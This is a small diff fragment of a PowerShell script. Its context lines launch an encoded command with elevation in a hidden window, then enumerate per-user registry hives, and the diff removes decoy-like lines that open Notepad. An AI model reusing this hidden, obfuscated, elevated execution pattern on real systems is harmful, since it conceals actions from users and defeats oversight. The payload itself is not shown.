@@ -15,9 +15,6 @@ $scriptBlock10={
             Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCommandlove" -Verb RunAs -Wait -WindowStyle Hidden
 
             #execute to user
-            Start-Process notepad
-            Start-Sleep 10
-            Start-Process npowershell
             #execute stuff for the background
             $sidKeys = Get-ChildItem -Path "Registry::HKEY_USERS"  |Where-Object { $_.Name -match "S-1-5-21" -and $_.Name -notlike "*_Classes"} | Select-Object -Property Name
             # Loop through each SID and perform an action (for example, display the SID name)
